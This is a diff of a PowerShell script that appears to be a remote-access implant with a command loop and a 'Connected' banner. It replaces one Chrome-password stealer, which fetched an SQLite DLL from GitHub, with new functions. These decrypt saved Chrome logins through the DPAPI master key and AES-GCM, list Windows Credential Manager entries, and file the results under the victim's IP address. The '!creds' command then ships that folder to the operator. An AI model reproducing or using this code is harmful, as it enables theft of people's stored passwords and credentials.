@@ -394,159 +394,113 @@ function PortSuggest {
 
 
 
+    function Get-ChromePasswords {
+    param (
+        [string]$OutFile = "chrome_passwords.txt"
+    )
 
-
- function Load-SQLite {
-    $dllPath = "$env:TEMP\System.Data.SQLite.dll"
-    $url = "https://github.com/zipo0/studytime-/raw/41c368d7469e8e85d41837a2e278c215bc49044c/System.Data.SQLite.dll"
-
-    try {
-        Output-Log "[*] Downloading System.Data.SQLite.dll from GitHub..."
-        Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
-        Add-Type -Path $dllPath -ErrorAction Stop
-        Output-Log "[+] SQLite DLL loaded successfully!"
-        return $true
-    } catch {
-        Output-Log "[ERROR] Load-SQLite failed: $($_.Exception.Message)"
-        return $false
-    }
-}
-function Get-DecryptedChromeCreds {
     Add-Type -AssemblyName System.Security
-    if (-not (Load-SQLite)) {
-        Output-Log "[ERROR] SQLite not loaded"
-        return "[ERROR] SQLite not loaded"
+    $localAppData = $env:LOCALAPPDATA
+    $chromeLoginData = "$localAppData\Google\Chrome\User Data\Default\Login Data"
+    $chromeState = "$localAppData\Google\Chrome\User Data\Local State"
+
+    if (!(Test-Path $chromeLoginData) -or !(Test-Path $chromeState)) {
+        throw "Chrome data not found."
     }
 
-    $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
-    $loginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+    $tmpLogin = "$env:TEMP\login_data_tmp"
+    Copy-Item $chromeLoginData $tmpLogin -Force
 
-    if (!(Test-Path $localStatePath) -or !(Test-Path $loginDataPath)) {
-        Output-Log "[ERROR] Chrome data not found."
-        return "[ERROR] Chrome data not found."
-    }
+    $json = Get-Content $chromeState -Raw | ConvertFrom-Json
+    $key_b64 = $json.os_crypt.encrypted_key
+    $key_dpapi = [System.Convert]::FromBase64String($key_b64)[5..-1]
+    $aesKey = [System.Security.Cryptography.ProtectedData]::Unprotect($key_dpapi, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
-    try {
-        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
-        $keyRaw = $localState.os_crypt.encrypted_key
-        if (-not $keyRaw) {
-            $keyRaw = $localState.os_crypt.app_bound_encrypted_key
-        }
-        if (-not $keyRaw) {
-            Output-Log "[ERROR] No Chrome encrypted key found."
-            return "[ERROR] No Chrome encrypted key found."
-        }
+    $connStr = "Data Source=$tmpLogin;Version=3;"
+    $conn = New-Object System.Data.SQLite.SQLiteConnection($connStr)
+    $conn.Open()
+    $cmd = $conn.CreateCommand()
+    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+    $reader = $cmd.ExecuteReader()
 
-        $encryptedKey = [Convert]::FromBase64String($keyRaw)
-        $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
-        $dpapiKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-    } catch {
-        Output-Log "[ERROR] Failed to decrypt Chrome master key: $($_.Exception.Message)"
-        return "[ERROR] Failed to decrypt Chrome master key: $($_.Exception.Message)"
-    }
+    $output = @()
+    while ($reader.Read()) {
+        $url = $reader.GetString(0)
+        $user = $reader.GetString(1)
+        $encPass = $reader.GetValue(2)
+        $raw = [byte[]]$encPass
+        if ($raw[0..2] -eq [byte[]](0x76,0x31,0x30)) { # 'v10'
+            $nonce = $raw[3..14]
+            $cipher = $raw[15..($raw.Length - 17)]
+            $tag = $raw[($raw.Length - 16)..($raw.Length - 1)]
 
-    $tempDb = "$env:TEMP\LoginData.db"
-    Copy-Item $loginDataPath -Destination $tempDb -Force
-
-    try {
-        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;")
-        $conn.Open()
-        $cmd = $conn.CreateCommand()
-        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-        $reader = $cmd.ExecuteReader()
-
-        $results = @()
-        while ($reader.Read()) {
-            try {
-                $url = $reader.GetString(0)
-                $username = $reader.GetString(1)
-                $encPass = $reader["password_value"]
-                $encBytes = New-Object byte[] $encPass.Length
-                $encPass.Read($encBytes, 0, $encBytes.Length) | Out-Null
-
-                $prefix = [BitConverter]::ToString($encBytes[0..4])
-                Output-Log "[DEBUG] Raw enc prefix: $prefix"
-
-                if ($encBytes[0] -eq 0x01 -and $encBytes[1] -eq 0x00 -and $encBytes[2] -eq 0x00 -and $encBytes[3] -eq 0x00) {
-                    $plainText = [System.Security.Cryptography.ProtectedData]::Unprotect($encBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-                }
-                elseif ([System.Text.Encoding]::ASCII.GetString($encBytes[0..2]) -eq "v10") {
-                    $nonce = $encBytes[3..14]
-                    $ciphertext = $encBytes[15..($encBytes.Length - 17)]
-                    $tag = $encBytes[($encBytes.Length - 16)..($encBytes.Length - 1)]
-
-                    $aes = [System.Security.Cryptography.AesGcm]::new($dpapiKey)
-                    $plaintextBytes = New-Object byte[] $ciphertext.Length
-                    $aes.Decrypt($nonce, $ciphertext, $tag, $plaintextBytes)
-                    $plainText = $plaintextBytes
-                }
-                else {
-                    Output-Log "[DEBUG] Unknown encryption format"
-                    continue
-                }
-
-                $results += "$url,$username,$([System.Text.Encoding]::UTF8.GetString($plainText))"
-            } catch {
-                Output-Log "[DEBUG] General decrypt error: $($_.Exception.Message)"
-                $results += "[!] Failed to decrypt row"
-            }
-        }
-
-        $reader.Close()
-        $conn.Close()
-        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
-
-        $outPath = "$env:TEMP\chrome_creds.csv"
-        Output-Log "[DEBUG] Attempting to write creds to: $outPath"
-        $results | Set-Content -Path $outPath
-
-        if (Test-Path $outPath) {
-            Output-Log "[DEBUG] File successfully created at: $outPath"
-            return $outPath
+            $aes = [System.Security.Cryptography.AesGcm]::new($aesKey)
+            $plaintext = New-Object byte[] ($cipher.Length)
+            $aes.Decrypt($nonce, $cipher, $tag, $plaintext)
+            $password = [System.Text.Encoding]::UTF8.GetString($plaintext)
         } else {
-            Output-Log "[DEBUG] Failed to create file: $outPath"
-            return "[ERROR] Chrome creds extraction returned empty result."
+            $password = [System.Text.Encoding]::UTF8.GetString(
+                [System.Security.Cryptography.ProtectedData]::Unprotect($raw, $null, 'CurrentUser')
+            )
         }
-    } catch {
-        Output-Log "[DEBUG] Exception during Chrome creds extraction: $($_.Exception.Message)"
-        return "[ERROR] Chrome creds extraction failed: $($_.Exception.Message)"
+        $output += "$url`t$user`t$password"
     }
+
+    $conn.Close()
+    $output | Out-File $OutFile -Encoding UTF8
+    Remove-Item $tmpLogin -Force
 }
 
-function Get-Credentials {
-    try {
-        $chromeCreds = Get-DecryptedChromeCreds
-        Output-Log "[DEBUG] chromeCreds raw: '$chromeCreds'"
 
-        $chromeCreds = $chromeCreds.Trim("'\"")
+function Get-WinCreds {
+    param (
+        [string]$OutFile = "win_credentials.txt"
+    )
 
-        if ((Test-Path $chromeCreds) -and ($chromeCreds -like "*.csv")) {
-            Output-Log "[+] Chrome creds saved to file: $chromeCreds"
-            $upload = Upload-File $chromeCreds
-            Output-Log $upload
-            return $upload
-        } else {
-            Output-Log "[ERROR] Chrome creds extraction returned non-path result: $chromeCreds"
-            return "[ERROR] Chrome creds extraction failed."
+    $output = @()
+    $creds = cmdkey /list | Where-Object {$_ -like "Target:*"} | ForEach-Object { ($_ -split ":")[1].Trim() }
+    foreach ($target in $creds) {
+        try {
+            $cred = (cmdkey /list:$target | Select-String "User name" | ForEach-Object { ($_ -split ":")[1].Trim() })
+            $output += "$target`t$cred"
+        } catch {
+            $output += "$target`tERROR"
         }
-    } catch {
-        return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
     }
+
+    $output | Out-File $OutFile -Encoding UTF8
 }
 
 
 
 
+    
+    function Get-CredentialsFull {
+    param (
+        [string]$OutFolder = ".\creds"
+    )
 
+    # Создание папки
+    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "169.*"} | Select-Object -First 1).IPAddress
+    $targetDir = Join-Path $OutFolder $ip
+    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
 
+    # Извлечение Chrome паролей
+    try {
+        Get-ChromePasswords -OutFile "$targetDir\chrome_passwords.txt"
+    } catch {
+        "Ошибка Chrome: $_" | Out-File "$targetDir\chrome_passwords.txt"
+    }
 
+    # Извлечение из Windows Credential Manager
+    try {
+        Get-WinCreds -OutFile "$targetDir\win_credentials.txt"
+    } catch {
+        "Ошибка Windows CredMan: $_" | Out-File "$targetDir\win_credentials.txt"
+    }
 
-
-
-
-
-
-
+    return $targetDir
+}
 
 
 
@@ -767,7 +721,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TEST creds 21 +sql
+                                            GO AROUND                                                                                                                                                                    
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
@@ -826,7 +780,9 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         $response = Tree-List
                     }
                     elseif ($cmd -eq "!creds") {
-                        $response = Get-Credentials
+                       $credsPath = Get-CredentialsFull
+                        Send-FileRecursive $credsPath
+                        continue
                     }
                     elseif ($cmd -eq "scanHosts") {
                         Get-AliveHosts -stream $stream
